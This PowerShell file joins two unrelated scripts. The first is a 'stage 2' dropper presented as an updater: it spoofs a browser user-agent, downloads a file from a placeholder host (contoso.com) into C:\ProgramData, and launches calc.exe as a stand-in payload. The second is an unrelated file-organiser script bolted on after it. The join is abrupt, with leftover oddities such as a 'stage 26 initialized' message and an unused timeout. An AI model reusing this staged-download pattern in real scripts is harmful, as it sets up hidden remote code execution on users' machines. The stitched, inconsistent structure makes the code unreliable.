
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://contoso.com/stage2.ps1',
    [string]$Stage2Path = 'C:\ProgramData\stage2.bin',
    [string]$TracePath = "$env:TEMP\stage.log",
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TimeoutSec = 161,
    [int]$MaxAttempts = 1,
    [int]$BackoffSeconds = 12
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 1,
        [int]$RetryDelay = 12,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TransferUrl
    $TransferResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $Stage2Path -RetryCount $MaxAttempts -RetryDelay $BackoffSeconds -UserAgent $RequestAgent
    if ($TransferResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe"
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TransferUrl
    Destination = $Stage2Path
    RetryCount = $MaxAttempts
    TimeoutSec = $TimeoutSec
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Resolving configured target"
Write-Verbose "Operation completed"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Applying operation timeout"
Write-Output "stage 26 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$SourcePath = "C:\Users\Public\Documents\Inbox"
$DestinationRoot = 'E:\SortedFiles'
$LogPath = 'C:\Logs\organise-2024-05-04.log'
$DryRun = $false
$WarningPreference = 'Continue'
$hostName = $env:COMPUTERNAME
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Sort-Object -Property Count -Descending
$byFolder | Format-Table Name, Count -AutoSize

$sizes = $files | Measure-Object -Property Length -Sum
Write-Verbose ("Total size: {0:N1} MB" -f ($sizes.Sum / 1MB))

$undoPath = $LogPath.Replace('.log', '-undo.csv')
$moved | Export-Csv -Path $undoPath -NoTypeInformation -Encoding UTF8
Write-Verbose ("Undo file: {0}" -f $undoPath)

$duplicates = $files | Group-Object -Property Name | Where-Object { $_.Count -gt 1 }
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate file names in source: {0}" -f @($duplicates).Count)
}
$skipped = @(Get-ChildItem -LiteralPath $SourcePath -File |
    Where-Object { -not $map.ContainsKey($_.Extension.ToLower()) }).Count
Write-Verbose ("Skipped unknown extensions: {0}" -f $skipped)
$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byFolder | ConvertTo-Html -Title 'Organiser summary' -Head $style |
    Set-Content -Path $LogPath.Replace('.log', '.html') -Encoding UTF8

$logLine = "{0} organised {1} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), @($moved).Count
Add-Content -Path $LogPath -Value $logLine -Encoding UTF8
Write-Host ("Organiser finished: {0} files" -f @($moved).Count) -ForegroundColor Green

$hashList = foreach ($item in $files | Select-Object -First 10) {
    [pscustomobject]@{ Name = $item.Name; Hash = (Get-FileHash -LiteralPath $item.FullName -Algorithm SHA256).Hash }
}
$hashList | Format-Table Name -AutoSize

$largeFiles = $files | Sort-Object -Property Length -Descending | Select-Object -First 5
$largeFiles | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$oldFiles = Get-ChildItem -LiteralPath $SourcePath -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-90) }
Write-Verbose ("Files older than 90 days: {0}" -f @($oldFiles).Count)

$emptyFolders = Get-ChildItem -LiteralPath $SourcePath -Directory -Force |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force).Count -eq 0 }
Write-Verbose ("Empty source folders: {0}" -f @($emptyFolders).Count)

$freeSpace = Get-PSDrive -Name ($DestinationRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Destination free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
